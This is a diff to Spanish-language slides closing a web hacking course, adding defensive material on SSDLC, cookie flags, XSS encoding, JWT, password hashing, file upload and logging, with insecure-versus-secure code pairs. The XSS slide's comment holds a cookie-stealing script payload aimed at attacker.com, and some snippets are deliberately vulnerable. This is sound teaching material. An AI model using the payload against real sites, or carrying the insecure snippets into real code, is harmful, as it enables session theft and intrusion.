@@ -7,8 +7,7 @@
 ### Cierre del Curso
 
 > Curso de Web Hacking
-> Duración: 2 horas
-> Objetivo: cerrar el ciclo entre ataque, detección y defensa
+> Del ataque a la defensa — los mismos sistemas, otra perspectiva
 
 ---
 
@@ -62,6 +61,41 @@
 | Brute Force | Probar credenciales masivamente | Rate limiting + MFA |
 
 **Pensar como atacante ayuda a elegir controles reales.**
+
+---
+
+## Ciclo de Vida Seguro (SSDLC)
+
+---
+
+## Qué pasa cuando la seguridad llega tarde
+
+| Fase | Sin seguridad | Consecuencia |
+| --- | --- | --- |
+| Requisitos | Solo funcionalidad | Controles de seguridad fuera del scope |
+| Diseño | Solo arquitectura | Vulnerabilidades estructurales (BOLA, Mass Assignment) |
+| Desarrollo | Código que "funciona" | SQLi, XSS, secretos en el código |
+| Testing | Solo unit / integration | Sin cobertura de casos de abuso |
+| Deploy | Subir y rezar | Sin hardening, secrets en texto plano |
+| Monitor | Logs de errores | Sin detección de ataques en curso |
+
+> **Shift-left:** detectar una vulnerabilidad en diseño cuesta 10× menos que en producción.
+
+---
+
+## Shift-Left — seguridad en cada fase
+
+```
+Requisitos → Diseño → Código → Tests → Deploy → Monitor
+    |           |        |        |        |         |
+  Threat     Secure    Code    SAST/  Hardening  SIEM /
+  Model      Design   Review   DAST   Secrets    Alertas
+```
+
+**Cada control tiene su fase natural:**
+- Code review no reemplaza pentest
+- WAF no reemplaza prepared statements
+- Monitoring no reemplaza validación de input
 
 ---
 
@@ -125,7 +159,7 @@ Tres headers simples, muchísimo valor defensivo.
 
 ---
 
-## Demo — verificar headers
+## Headers en vivo: Juice Shop vs DVWA
 
 ### Inspección rápida con CLI y scanners
 
@@ -194,7 +228,31 @@ Sin estos flags:
 
 ---
 
-## Demo — cookies en Burp
+## Cookies — código inseguro vs seguro
+
+**Inseguro (Node.js / Express):**
+
+```js
+res.cookie('session', token)
+// Sin atributos → XSS roba la cookie, CSRF funciona, viaja por HTTP
+```
+
+**Seguro:**
+
+```js
+res.cookie('session', token, {
+  httpOnly: true,    // JS no puede leer la cookie
+  secure:   true,    // Solo viaja por HTTPS
+  sameSite: 'lax',   // Protección básica contra CSRF
+  maxAge:   3_600_000  // 1 hora de vida
+})
+```
+
+Un objeto de opciones → tres vectores de ataque cerrados simultáneamente.
+
+---
+
+## Cookies en Burp: qué buscar
 
 - Logueate en Juice Shop y capturá el response
 - Revisá `Set-Cookie` en **Proxy** o **Repeater**
@@ -274,6 +332,33 @@ Cada contexto requiere encoding distinto:
 | SQL | Prepared statements |
 
 **Mensaje clave:** no existe “sanitización universal”. Existe encoding correcto para cada contexto.
+
+---
+
+## XSS — código vulnerable vs seguro
+
+**Vulnerable (PHP — concatenación directa):**
+
+```php
+echo "<p>Hola, " . $_GET['name'] . "</p>";
+// ?name=<script>document.location='http://attacker.com/'+document.cookie</script>
+```
+
+**Seguro (PHP — encoding contextual):**
+
+```php
+echo "<p>Hola, " . htmlspecialchars($_GET['name'], ENT_QUOTES, 'UTF-8') . "</p>";
+```
+
+**En React:**
+
+```jsx
+// JSX escapa automáticamente
+return <p>Hola, {name}</p>
+
+// JAMAS con input de usuario
+return <p dangerouslySetInnerHTML={{ __html: name }} />
+```
 
 ---
 
@@ -395,6 +480,193 @@ app.use('/login', rateLimit({ windowMs: 15 * 60 * 1000, max: 5 }))
 ```
 
 Rate limiting no arregla credenciales débiles, pero compra tiempo y fricción.
+
+---
+
+## JWT Seguro
+
+---
+
+## Errores comunes con JWT
+
+- `alg: none` → sin firma, cualquiera forja tokens
+- Secreto HS256 débil → crackeable con diccionario
+- Sin `exp` → token válido para siempre
+- Sin validación server-side → firma firmada pero claims no verificados
+- Secreto hardcodeado en el frontend → visible en el browser
+
+> En M4 explotamos estas debilidades. Ahora sabemos cómo cerrarlas.
+
+---
+
+## Cómo implementar JWT bien
+
+| Buena práctica | Por qué importa |
+| --- | --- |
+| RS256 en producción | La clave privada nunca sale del servidor |
+| Secreto HS256 ≥ 32 bytes random | Resiste ataques de diccionario |
+| Incluir `exp`, `iat`, `nbf` | Limita ventana de validez |
+| Validar firma siempre en backend | No confiar en claims sin verificar |
+| Rotar y revocar tokens | Cierra sesiones comprometidas |
+
+```js
+jwt.sign(payload, process.env.JWT_SECRET, { expiresIn: '1h', algorithm: 'HS256' })
+```
+
+---
+
+## JWT — código inseguro vs seguro
+
+**Inseguro:**
+
+```js
+const token = jwt.sign({ userId: 1, role: 'admin' }, 'secret')
+// ❌ Secreto débil, sin expiración, sin algoritmo explícito
+
+const data = jwt.decode(token)   // ❌ No verifica firma — cualquier token pasa
+```
+
+**Seguro:**
+
+```js
+const token = jwt.sign(
+  { userId: 1, role: 'admin' },
+  process.env.JWT_SECRET,                   // ≥ 32 bytes random
+  { expiresIn: '1h', algorithm: 'HS256' }
+)
+
+jwt.verify(token, process.env.JWT_SECRET, { algorithms: ['HS256'] }, (err, payload) => {
+  if (err) return res.status(401).json({ error: 'Token inválido' })
+  req.user = payload
+  next()
+})
+```
+
+---
+
+## Autenticación Segura
+
+---
+
+## Hashing de contraseñas
+
+| Algoritmo | ¿Seguro? | Problema |
+| --- | --- | --- |
+| MD5 | ❌ | Roto, tablas rainbow |
+| SHA-256 (solo) | ❌ | Rápido = crackeable con GPU |
+| bcrypt | ✅ | Work factor configurable |
+| Argon2 | ✅ | Ganador Password Hashing Competition |
+
+```js
+const hash = await bcrypt.hash(password, 12)  // work factor = 12
+const ok   = await bcrypt.compare(input, hash)
+```
+
+**Nunca** guardar contraseñas en texto plano, MD5 ni SHA-1.
+
+---
+
+## Account Lockout y MFA
+
+**Account lockout:**
+- Limitar intentos fallidos por cuenta (no solo por IP)
+- Delay exponencial: 1s → 2s → 4s → 8s...
+- Alertar al usuario legítimo por email
+
+**MFA (Multi-Factor Authentication):**
+- TOTP: Google Authenticator, Authy
+- WebAuthn / passkeys (más robusto)
+- SMS como último recurso (vulnerable a SIM-swap)
+
+> Un atacante con la contraseña aún necesita el segundo factor.
+
+---
+
+## File Upload — Defensa
+
+---
+
+## Cómo defender uploads de archivos
+
+En M4 bypasseamos `getimagesize()`, magic bytes y extensiones.
+La defensa real requiere múltiples capas simultáneas:
+
+| Control | Implementación |
+| --- | --- |
+| Renombrar archivo | UUID + extensión controlada |
+| Almacenar fuera del webroot | `/var/uploads/` no `/public/` |
+| Sin permisos de ejecución | `chmod 644` en uploads |
+| Validar MIME real | `finfo_file()`, no `$_FILES['type']` |
+| Allowlist de extensiones | Solo `.jpg`, `.png`, `.pdf` |
+| Limitar tamaño | Evita DoS por storage |
+| Servir desde CDN o handler seguro | Sin URL directa al archivo |
+
+**Principio:** el archivo nunca debe ser ejecutable ni accesible como código.
+
+---
+
+## File Upload — código inseguro vs seguro
+
+**Inseguro (PHP):**
+
+```php
+$filename = $_FILES['file']['name'];                       // nombre del usuario
+move_uploaded_file($_FILES['file']['tmp_name'], "uploads/$filename");
+echo "Acceso: uploads/$filename";                          // URL directa → ejecución
+```
+
+**Seguro (PHP):**
+
+```php
+$allowed = ['image/jpeg', 'image/png'];
+$mime    = (new finfo(FILEINFO_MIME_TYPE))->file($_FILES['file']['tmp_name']);
+
+if (!in_array($mime, $allowed))        die('Tipo no permitido');
+if ($_FILES['file']['size'] > 2000000) die('Archivo demasiado grande');
+
+$name = bin2hex(random_bytes(16)) . '.jpg';   // nombre aleatorio
+$dest = '/var/uploads/' . $name;              // fuera del webroot
+move_uploaded_file($_FILES['file']['tmp_name'], $dest);
+chmod($dest, 0644);                           // sin permisos de ejecución
+```
+
+---
+
+## Logging & Alertas
+
+---
+
+## Qué logear (y qué NO)
+
+### ✅ Logear siempre
+- Intentos de login (exitosos y fallidos)
+- Cambios de contraseña y email
+- Acciones administrativas
+- Errores de validación con input rechazado
+- Rate limit disparado
+
+### ❌ Nunca logear
+- Contraseñas (ni hasheadas)
+- Tokens y API keys completos
+- Datos de tarjetas (PCI DSS)
+- Datos personales sensibles (GDPR)
+
+> Un log con passwords es un segundo vector de compromiso.
+
+---
+
+## Alertas útiles para seguridad
+
+| Evento | Señal |
+| --- | --- |
+| 5+ logins fallidos / cuenta / minuto | Posible brute force |
+| Login exitoso desde país nuevo | Anomalía geográfica |
+| Tasa de 4xx > umbral normal | Fuzzing o scanner activo |
+| Exportación masiva de datos | Exfiltración potencial |
+| Cambio de rol o privilegios | Revisión urgente |
+| Error de validación JWT frecuente | Ataque de forging |
+
+**Herramientas:** ELK Stack, Grafana + Loki, Datadog, Splunk, CloudWatch
 
 ---
 
